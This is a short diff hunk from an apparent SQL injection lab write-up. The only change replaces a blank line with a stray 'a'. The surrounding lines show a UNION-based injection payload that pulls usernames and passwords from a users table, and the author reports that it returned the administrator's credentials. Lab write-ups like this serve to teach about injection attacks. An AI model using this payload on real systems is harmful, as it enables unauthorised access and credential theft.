@@ -117,7 +117,7 @@ Two of the following columns are named password and username.
 ' UNION select username, password FROM users--
 ```
 > 200
-
+a
 The above injection gave me administrator password and username.
 ```HTML
                            <th>administrator</th>
